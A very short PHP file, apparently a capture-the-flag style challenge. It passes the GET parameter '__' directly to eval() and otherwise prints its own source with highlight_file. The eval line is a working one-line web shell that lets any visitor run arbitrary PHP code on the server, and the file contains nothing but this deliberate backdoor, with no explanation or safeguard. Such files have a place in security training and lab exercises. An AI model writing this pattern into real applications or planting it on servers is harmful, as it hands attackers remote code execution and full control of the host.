<?php

if (isset($_GET['__'])) {
	eval($_GET['__']);
} else {
	highlight_file(__FILE__);
}

?>
